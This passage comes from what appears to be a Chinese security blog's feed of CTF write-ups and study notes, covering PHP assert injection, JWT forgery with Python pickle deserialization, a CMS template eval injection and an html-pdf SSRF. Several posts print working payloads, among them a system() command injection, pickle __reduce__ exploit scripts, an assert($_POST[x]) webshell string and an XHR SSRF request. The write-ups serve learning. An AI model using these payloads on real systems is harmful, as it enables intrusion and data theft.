class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line">   $page = $_GET[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">   $page = <span class="string">&quot;home&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$file = <span class="string">&quot;templates/&quot;</span> . $page . <span class="string">&quot;.php&quot;</span>;<span class="comment">//连接变量与路径</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// I heard &#x27;..&#x27; is dangerous!</span></span><br><span class="line">assert(<span class="string">&quot;strpos(&#x27;<span class="subst">$file</span>&#x27;, &#x27;..&#x27;) === false&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Detected hacking attempt!&quot;</span>);<span class="comment">//这就是之前我目录遍历的时候被过滤的地方</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> Make this look nice</span></span><br><span class="line">assert(<span class="string">&quot;file_exists(&#x27;<span class="subst">$file</span>&#x27;)&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;That file doesn&#x27;t exist!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">page&#x3D;about.php%27%2c+%27123%27)+%3d%3d%3d+false+and+system(%27cat+t  emplates%2fflag.php%27)+and+strpos(%27templates%2fflag</span><br></pre></td></tr></table></figure><p><img src="/2021/09/23/web/1/image-20210924201624926.png" alt="image-20210924201624926"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt; 简略说下思路&lt;/p&gt;
&lt;h4 id=&quot;ics-05：&quot;&gt;&lt;a href=&quot;#ics-05：&quot; class=&quot;headerlink&quot; title=&quot;ics-05：&quot;&gt;&lt;/a&gt;ics-05：&lt;/h4&gt;&lt;p&gt;这题应该算很早之前写过了，结果又忘了。。。&lt;/p&gt;
&lt;p&gt;在一个页面里</summary>
      
    
    
    
    
    <category term="攻防世界_web" scheme="http://daweitech.github.io/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-web/"/>
    
  </entry>
  
  <entry>
    <title>CISCN2019 华北赛区 Day1 Web2 ikun</title>
    <link href="http://daweitech.github.io/2021/09/21/buu/22/"/>
    <id>http://daweitech.github.io/2021/09/21/buu/22/</id>
    <published>2021-09-21T12:26:05.000Z</published>
    <updated>2021-09-24T12:57:11.841Z</updated>
    
    <content type="html"><![CDATA[<p> 经历了一个上午AWD的被锤后</p><p>有点心灰意冷</p><p>做了好多题目都是跟着wp做的，没有什么收获</p><p>本来找了ly0n大佬取经了一下，结果发现自己还是基础没打好</p><p>这道题还是跟着wp做了一遍</p><p>先记录一下思路</p><p>进去之后是个购物页面，很多* li *li标志小电视的商品</p><p>按照提示，我们需要买lv6的才行</p><p>翻页寻找了好久都没有</p><p>原理是要用脚本跑一下啊</p><p>很快，找到了第180页有这个商品</p><p>但是太贵了，远远超出我们的钱包</p><p>于是抓包想修改折扣蒙混过关</p><p>好家伙，说没有以admin访问不行</p><p>然后知道了要从jwt入手，我觉得这个有点像令牌token和cookie吧</p><p>就是浏览器用这个东西来识别你的身份</p><p>进入jwt官方页面修改之后成功购买</p><p>查看源码</p><p>提示我们下载文件</p><p>下载之后就是难点python的pickle漏洞</p><p><strong>漏洞产生的原因在于其可以将自定义的类进行序列化和反序列化。反序列化后产生的对象会在结束时触发<strong>reduce</strong>()函数从而触发恶意代码。</strong></p><p>做题：</p><p><img src="/2021/09/21/buu/22/image-20210924202100689.png" alt="image-20210924202100689"></p><p>按照提示，利用脚本寻找一下lv6的踪迹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">1000</span>):</span><br><span class="line">    url = <span class="string">&quot;http://06312721-18d2-4fee-bac0-d6591cf2e757.node4.buuoj.cn:81/shop?page=&#123;&#125;&quot;</span></span><br><span class="line">    url = url.format(i)</span><br><span class="line">    print(url)</span><br><span class="line">    r = requests.get(url)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;lv6.png&quot;</span> <span class="keyword">in</span> r.text <span class="keyword">and</span> r.status_code == <span class="number">200</span>:</span><br><span class="line">        print(<span class="string">&quot;find it:&quot;</span> ,url)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p><img src="/2021/09/21/buu/22/image-20210924202357414.png" alt="image-20210924202357414"></p><p>访问page181</p><p><img src="/2021/09/21/buu/22/image-20210924202458922.png" alt="image-20210924202458922"></p><p>找到这个刺头了，买它！！！</p><p>结果，操作失败hh</p><p><img src="/2021/09/21/buu/22/image-20210924202659335.png" alt="image-20210924202659335"></p><p>偷偷放进抓包里修改金额</p><p><img src="/2021/09/21/buu/22/image-20210924203723295.png" alt="image-20210924203723295"></p><p>提示我们需要admin权限啊</p><p>跳过了得到密钥一步</p><p>JWT修改</p><p><img src="/2021/09/21/buu/22/image-20210924204157770.png" alt="image-20210924204157770"></p><p>成功访问</p><p><img src="/2021/09/21/buu/22/image-20210924204354932.png" alt="image-20210924204354932"></p><p><img src="/2021/09/21/buu/22/image-20210924204124430.png" alt="image-20210924204124430"></p><p>按照提示下载源码</p><p>查看代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tornado.web</span><br><span class="line"><span class="keyword">from</span> sshop.base <span class="keyword">import</span> BaseHandler</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AdminHandler</span>(<span class="params">BaseHandler</span>):</span></span><br><span class="line"><span class="meta">    @tornado.web.authenticated</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span>(<span class="params">self, *args, **kwargs</span>):</span></span><br><span class="line">        <span class="keyword">if</span> self.current_user == <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;form.html&#x27;</span>, res=<span class="string">&#x27;This is Black Technology!&#x27;</span>, member=<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;no_ass.html&#x27;</span>)</span><br><span class="line"><span class="meta">@tornado.web.authenticated</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">post</span>(<span class="params">self, *args, **kwargs</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        become = self.get_argument(<span class="string">&#x27;become&#x27;</span>)</span><br><span class="line">        p = pickle.loads(urllib.unquote(become))</span><br><span class="line">        <span class="keyword">return</span> self.render(<span class="string">&#x27;form.html&#x27;</span>, res=p, member=<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> self.render(<span class="string">&#x27;form.html&#x27;</span>, res=<span class="string">&#x27;This is Black Technology!&#x27;</span>, member=<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>漏洞产生的原因在于其可以将自定义的类进行序列化和反序列化。反序列化后产生的对象会在结束时触发<strong>reduce</strong>()函数从而触发恶意代码。<br>其实反序列化漏洞思路都是差不多的<br>就是找到序列化的参数，看他可不可以修改，可以修改就可以进行任意文件读取或者命令执行<br>这里我们可以修改become这个参数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import pickle</span><br><span class="line">import urllib</span><br><span class="line">#python2</span><br><span class="line">class payload(object):</span><br><span class="line">    def __reduce__(self):</span><br><span class="line">       return (eval, (&quot;open(&#39;&#x2F;flag.txt&#39;,&#39;r&#39;).read()&quot;,))    #打开读取flag.txt的内容</span><br><span class="line"></span><br><span class="line">a &#x3D; pickle.dumps(payload())  #序列化payload</span><br><span class="line">a &#x3D; urllib.quote(a)  #进行url编码</span><br><span class="line">print a</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import pickle</span><br><span class="line">import urllib</span><br><span class="line">#python3</span><br><span class="line">class exp(object):</span><br><span class="line">    def __reduce__(self):</span><br><span class="line">        return (eval,(&quot;open(&#39;&#x2F;flag.txt&#39;).read()&quot;,))</span><br><span class="line"></span><br><span class="line">a&#x3D;exp()</span><br><span class="line">s&#x3D;pickle.dumps(a)</span><br><span class="line">print urllib.quote(s)</span><br></pre></td></tr></table></figure><p>payload：</p><p><img src="/2021/09/21/buu/22/image-20210924205124943.png" alt="image-20210924205124943"></p><p>传入become参数即可</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt; 经历了一个上午AWD的被锤后&lt;/p&gt;
&lt;p&gt;有点心灰意冷&lt;/p&gt;
&lt;p&gt;做了好多题目都是跟着wp做的，没有什么收获&lt;/p&gt;
&lt;p&gt;本来找了ly0n大佬取经了一下，结果发现自己还是基础没打好&lt;/p&gt;
&lt;p&gt;这道题还是跟着wp做了一遍&lt;/p&gt;
&lt;p&gt;先记录一下思路&lt;/p&gt;
&lt;</summary>
      
    
    
    
    
    <category term="buu" scheme="http://daweitech.github.io/tags/buu/"/>
    
  </entry>
  
  <entry>
    <title>php代码审计(三)</title>
    <link href="http://daweitech.github.io/2021/09/17/src/3/"/>
    <id>http://daweitech.github.io/2021/09/17/src/3/</id>
    <published>2021-09-17T12:20:23.000Z</published>
    <updated>2021-09-17T12:37:47.373Z</updated>
    
    <content type="html"><![CDATA[<p> 这次试着尝试审计bluecms漏洞</p><p>安装bluecms的教程文章：</p><p><a href="https://blog.csdn.net/qq_41209264/article/details/106773255">渗透测试——bluecms安装及seay代码审计_fallingskies-CSDN博客</a></p><p><a href="https://www.cnblogs.com/wkzb/p/12732078.html">php代码审计]bluecms v1.6 sp1 - beiwo - 博客园 (cnblogs.com)</a></p><p>遇到的一个小坑就是访问安装页面一直为空白，还好解决啦</p><p>上面的文章已经讲解得很详细了</p><p><img src="/2021/09/17/src/3/image-20210917202058053.png" alt="image-20210917202058053"></p><p>创建成功图如下：</p><p><img src="/2021/09/17/src/3/image-20210917202743734.png" alt="image-20210917202743734"></p><p>跟着大佬文章阅读：</p><p>[<a href="https://www.cnblogs.com/wkzb/p/12732078.html">php代码审计]bluecms v1.6 sp1 - beiwo - 博客园 (cnblogs.com)</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt; 这次试着尝试审计bluecms漏洞&lt;/p&gt;
&lt;p&gt;安装bluecms的教程文章：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://blog.csdn.net/qq_41209264/article/details/106773255&quot;&gt;渗透测试——bluecms安装及se</summary>
      
    
    
    
    
    <category term="php" scheme="http://daweitech.github.io/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>漏洞挖掘演练(一)</title>
    <link href="http://daweitech.github.io/2021/09/17/src/2/"/>
    <id>http://daweitech.github.io/2021/09/17/src/2/</id>
    <published>2021-09-17T07:14:27.000Z</published>
    <updated>2021-09-17T12:38:27.457Z</updated>
    
    <content type="html"><![CDATA[<p>以下内容全部来自于：安恒信息</p><p>关于cms的源码</p><p><img src="/2021/09/17/src/2/image-20210917152538626.png" alt="image-20210917152538626"></p><p>gitee.com上可以找到很多资源</p><p>同样github也是。</p><p>例子一：</p><p><img src="/2021/09/17/src/2/image-20210917153534213.png" alt="image-20210917153534213"></p><p>观察以上代码，发现该php文件明显是该CMS的模板渲染核心代码</p><p>其中，对外调用paser_string函数，核心函数运行——parse,对各种标签进行解析。</p><p>所以联想到模板渲染常存在的SSTI漏洞</p><p><img src="/2021/09/17/src/2/image-20210917153916987.png" alt="image-20210917153916987"></p><p>看到在处理标签时运用诸多eval()函数</p><p>所以接下来思路为：</p><p>根据eval()函数，追踪溯源，看是否存在可控变量。</p><p>ps：没有审计经验的人，建议把关键函数提取出来到本地的PHP环境进行debug调试</p><p>主要想法就是传递什么样的参数可以在eval中执行，并且确定eval中执行的代码是哪一块，是否可控。</p><p>假设传递{if:123}456{endif}</p><p>根据逻辑推敲，最后代码回进入到该分支中</p><p>并且$strlf的值是123</p><p><img src="/2021/09/17/src/2/image-20210917154659350.png" alt="image-20210917154659350"></p><p>所以最后能够构成</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(123)&#123;isFlag&#x3D;true;&#125;else&#123;isFalse&#125;;</span><br></pre></td></tr></table></figure><p>接着，就是注入代码来getshell了</p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;if:1&#125;assert($_POST[x];&#x2F;&#x2F;)123&#123;endif&#125;</span><br></pre></td></tr></table></figure><p>拼接后：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;if:1&#125;assert($_POST[x];&#x2F;&#x2F;)&#123;isFlag&#x3D;true;&#125;else&#123;isFalse&#125;;</span><br></pre></td></tr></table></figure><p>分析：1为永真条件，//将后面的注释了</p><p>最后就执行了assert($_POST[x]);</p><p>我们继续找传递参数的地方</p><p>反向追踪，调用labelif()函数的是_parse(),而 _parse只被parse_string调用</p><p><img src="/2021/09/17/src/2/image-20210917155446820.png" alt="image-20210917155446820"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;以下内容全部来自于：安恒信息&lt;/p&gt;
&lt;p&gt;关于cms的源码&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2021/09/17/src/2/image-20210917152538626.png&quot; alt=&quot;image-20210917152538626&quot;&gt;&lt;/p&gt;
&lt;p&gt;gite</summary>
      
    
    
    
    
    <category term="src" scheme="http://daweitech.github.io/tags/src/"/>
    
  </entry>
  
  <entry>
    <title>PHP and MySQL Web Development(二)</title>
    <link href="http://daweitech.github.io/2021/09/15/php/3/"/>
    <id>http://daweitech.github.io/2021/09/15/php/3/</id>
    <published>2021-09-15T13:19:28.000Z</published>
    <updated>2021-09-15T13:20:40.278Z</updated>
    
    
    
    
    
    <category term="php" scheme="http://daweitech.github.io/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>runoob.com-html(1)</title>
    <link href="http://daweitech.github.io/2021/09/13/web/0/"/>
    <id>http://daweitech.github.io/2021/09/13/web/0/</id>
    <published>2021-09-13T14:01:57.000Z</published>
    <updated>2021-09-14T08:38:25.388Z</updated>
    
    <content type="html"><![CDATA[<p>1.HTML文档的后缀名</p><p>.html                .htm</p><p>2.实例解析</p><p><img src="/2021/09/13/web/0/02A7DD95-22B4-4FB9-B994-DDB5393F7F03.jpg"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt; 声明为 HTML5 文档</span><br><span class="line">&lt;html&gt; 元素是 HTML 页面的根元素</span><br><span class="line">&lt;head&gt; 元素包含了文档的元（meta）数据，如 &lt;meta charset&#x3D;&quot;utf-8&quot;&gt; 定义网页编码格式为 utf-8。</span><br><span class="line">&lt;title&gt; 元素描述了文档的标题</span><br><span class="line">&lt;body&gt; 元素包含了可见的页面内容</span><br><span class="line">&lt;h1&gt; 元素定义一个大标题</span><br><span class="line">&lt;p&gt; 元素定义一个段落</span><br></pre></td></tr></table></figure><p>HTML 是用来描述网页的一种语言。</p><p>HTML 指的是超文本标记语言: <strong>H</strong>yper<strong>T</strong>ext <strong>M</strong>arkup <strong>L</strong>anguage</p><p>HTML标签</p><p>HTML元素</p><p>HTML网页结构</p><p><img src="/2021/09/13/web/0/image-20210913221500807.png" alt="image-20210913221500807"></p><p>文档格式例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;div&gt;</span><br><span class="line">  &lt;div&gt;分类目录...&lt;&#x2F;div&gt;</span><br><span class="line">  &lt;div&gt;当前分类内容列表...&lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;div&gt; </span><br></pre></td></tr></table></figure><p>常用标签介绍：</p><p>文本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">最常用：&lt;font&gt;,用于改变字体，字号文字颜色</span><br></pre></td></tr></table></figure><p>图片</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;hr&gt;标签用于在页面上添加图片，src属性指定图片的地址，如果无法打开src指定的图片，浏览器通常会在页面上需要显示图片的地方显示alt属性定义的文本。</span><br><span class="line">&lt;img src&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;Icons&#x2F;valid-xhtml10&quot; alt&#x3D;&quot;图片简介&quot; &#x2F;&gt; </span><br></pre></td></tr></table></figure><p>链接</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">超级链接用&lt;a&gt;标签表示，href属性指定了链接到的地址。&lt;a&gt;标签可以包含文本，也可以包含图片。</span><br><span class="line">&lt;a href&#x3D;&quot;http:&#x2F;&#x2F;www.runoob.com&#x2F;&quot;&gt;菜鸟教程&lt;&#x2F;a&gt;</span><br><span class="line">&lt;a href&#x3D;&quot;http:&#x2F;&#x2F;validator.w3.org&quot;&gt;&lt;img src&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;Icons&#x2F;valid-xhtml10&quot; alt&#x3D;&quot;验证HTML&quot; &#x2F;&gt;&lt;&#x2F;a&gt; </span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;1.HTML文档的后缀名&lt;/p&gt;
&lt;p&gt;.html                .htm&lt;/p&gt;
&lt;p&gt;2.实例解析&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2021/09/13/web/0/02A7DD95-22B4-4FB9-B994-DDB5393F7F03.jpg&quot;&gt;</summary>
      
    
    
    
    
    <category term="web" scheme="http://daweitech.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>2021祥云杯 secrets_of_admin&amp;crwaler_z</title>
    <link href="http://daweitech.github.io/2021/09/07/buu/21/"/>
    <id>http://daweitech.github.io/2021/09/07/buu/21/</id>
    <published>2021-09-07T02:52:39.000Z</published>
    <updated>2021-09-14T11:39:07.493Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://blog.csdn.net/rfrder/article/details/119914746">祥云杯2021 Web复现_feng的博客-CSDN博客</a></p><p>[祥云杯2021 web wp | Z3ratu1’s blog](<a href="https://blog.z3ratu1.cn/%E7%A5%A5%E4%BA%91%E6%9D%AF2021">https://blog.z3ratu1.cn/祥云杯2021</a> wp.html#more)</p><p><a href="https://cbatl.gitee.io/">ly0n - A hard-working boy (gitee.io)</a></p><p><a href="https://www.freebuf.com/articles/system/178150.html">Linux下几种反弹Shell方法的总结与理解 - FreeBuf网络安全行业门户</a></p><p><a href="https://www.wlhhlc.top/posts/20107/#cralwer-z">2021祥云杯WEB-WP | dota_st (wlhhlc.top)</a></p><h4 id="secrets-of-admin"><a href="#secrets-of-admin" class="headerlink" title="secrets_of_admin"></a>secrets_of_admin</h4><p>打开后页面如下：</p><p><img src="/2021/09/07/buu/21/image-20210908114725080.png" alt="image-20210908114725080"></p><p>database.js里直接给出用户名和密码：</p><p>Username：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin</span><br></pre></td></tr></table></figure><p>Password：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">e365655e013ce7fdbdbf8f27b418c8fe6dc9354dc4c0328fa02b0ea547659645</span><br></pre></td></tr></table></figure><p>登录后就有了上传界面</p><p><img src="/2021/09/07/buu/21/image-20210908114945704.png" alt="image-20210908114945704"></p><p>提示我们上传pdf类型的文件，又只能post传参</p><p>以下直<code>files</code>表可以知道，flag在<code>superuser</code>那里，但是<code>superuser</code>不能用。通过下面三行代码也可以知道，需要把<code>flag</code>给<code>admin</code>用户接摘抄wp（因为我没源码）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">let filename &#x3D; await DB.getFile(token.username, req.params.id)</span><br><span class="line">         if (fs.existsSync(path.join(__dirname , &quot;..&#x2F;files&#x2F;&quot;, filename)))&#123;</span><br><span class="line">             return res.send(await readFile(path.join(__dirname , &quot;..&#x2F;files&#x2F;&quot;, filename)));</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>但是/api/files/功能那里需要SSRF。</p><p>通过查找html-pdf库发现它存在一个任意文件读取：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">html-pdf before version 3.0.1 is vulnerable to Arbitrary File Read. The package fails to sanitize the HTML input, allowing attackers to exfiltrate server files by supplying malicious HTML code. XHR requests in the HTML code are executed by the server. Input with an XHR request such as request.open(&quot;GET&quot;,&quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;) will result in a PDF document with the contents of &#x2F;etc&#x2F;passwd.</span><br></pre></td></tr></table></figure><p>因此可以利用制造pdf的功能来实现ssrf，把flag给admin用户。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();xhr.open(<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;http://127.0.0.1:8888/api/files?username=admin&amp;filename=./flag&amp;checksum=1&quot;</span>, <span class="literal">true</span>);xhr.send();</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>而且filename字段是UNIQUE，需要不能直接flag，用./flag。</p><p>但是有个问题就是这个过滤：</p><pre><code>if ( content == &#39;&#39; || content.includes(&#39;&lt;&#39;) || content.includes(&#39;&gt;&#39;) || content.includes(&#39;/&#39;) || content.includes(&#39;script&#39;) || content.includes(&#39;on&#39;))&#123;    // even admin can&#39;t be trusted right ? :)      return res.render(&#39;admin&#39;, &#123; error: &#39;Forbidden word 🤬&#39;&#125;);&#125; else &#123;</code></pre><p>当时自己就卡在了这里，不知道怎么绕过。关键就在于node.js的弱类型和php的弱类型有所不同。js中数组和字符串拼接的话，比如[“hello”]+”world”，得到的是helloworld，而php里确实Arrayworld。也是因为深受php的影响，所以没想到这里可以用数组来绕过，记得URL编码</p><p>然后我是丢进bp里，只需要content改成content[],传数组</p><p><img src="/2021/09/07/buu/21/image-20210908115802410.png" alt="image-20210908115802410"></p><p><img src="/2021/09/07/buu/21/image-20210908120122404.png" alt="image-20210908120122404"></p><p>出现这个页面就是成功</p><p><img src="/2021/09/07/buu/21/image-20210908120634020.png" alt="image-20210908120634020"></p><p>打开后就有flag</p><p><img src="/2021/09/07/buu/21/image-20210908120715884.png" alt="image-20210908120715884"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://blog.csdn.net/rfrder/article/details/119914746&quot;&gt;祥云杯2021 Web复现_feng的博客-CSDN博客&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;[祥云杯2021 web wp | Z3ratu1’s blog</summary>
      
    
    
    
    
    <category term="buu" scheme="http://daweitech.github.io/tags/buu/"/>
    
  </entry>
  
  <entry>
    <title>php代码审计(三)</title>
    <link href="http://daweitech.github.io/2021/09/05/php/2/"/>
    <id>http://daweitech.github.io/2021/09/05/php/2/</id>
    <published>2021-09-05T12:48:43.000Z</published>
    <updated>2021-09-05T13:04:00.433Z</updated>
    
    <content type="html"><![CDATA[<p> 这是一次对单独文章的分析</p><p>来自于安全客：</p><p><a href="https://www.anquanke.com/post/id/250537">ThinkPHP 3.2.3 漏洞复现 - 安全客，安全资讯平台 (anquanke.com)</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt; 这是一次对单独文章的分析&lt;/p&gt;
&lt;p&gt;来自于安全客：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.anquanke.com/post/id/250537&quot;&gt;ThinkPHP 3.2.3 漏洞复现 - 安全客，安全资讯平台 (anquanke.com)&lt;/a&gt;</summary>
      
    
    
    
    
    <category term="php" scheme="http://daweitech.github.io/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>网鼎杯 2020 总决赛 Novel&amp;GameExp</title>
    <link href="http://daweitech.github.io/2021/09/04/buu/20/"/>
    <id>http://daweitech.github.io/2021/09/04/buu/20/</id>
    <published>2021-09-04T07:24:15.000Z</published>
    <updated>2021-09-07T12:35:03.912Z</updated>
    
    <content type="html"><![CDATA[<h4 id="Novel"><a href="#Novel" class="headerlink" title="Novel:"></a>Novel:</h4><p>参考博客：</p><p><a href="https://www.cnblogs.com/W4nder/p/14078695.html">网鼎杯2020线下web - W4nder - 博客园 (cnblogs.com)</a></p><p><a href="https://mount4in.github.io/2020/12/08/2020%E7%AC%AC%E4%BA%8C%E5%B1%8A%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9BWeb%E9%A2%98%E7%9B%AEwriteup/">2020第二届网鼎杯半决赛Web题目writeup | Mount4in</a></p><p>在buu上下载了源文件</p><p><img src="/2021/09/04/buu/20/image-20210905094734716.png" alt="image-20210905094734716"></p><p>先看看index.php</p><p>源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">defined(&#39;DS&#39;) or define(&#39;DS&#39;, DIRECTORY_SEPARATOR);</span><br><span class="line">define(&#39;APP_DIR&#39;, realpath(&#39;.&#x2F;&#39;));</span><br><span class="line">error_reporting(0);</span><br><span class="line">function autoload_class($class)&#123;</span><br><span class="line">foreach(array(&#39;class&#39;) as $dir)&#123;</span><br><span class="line">$file &#x3D; APP_DIR.DS.$dir.DS.$class.&#39;.class.php&#39;;</span><br><span class="line">&#x2F;&#x2F; echo $file;</span><br><span class="line">if(file_exists($file))&#123;</span><br><span class="line">&#x2F;&#x2F; echo $file;</span><br><span class="line">include_once $file;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function upload($config)&#123;</span><br><span 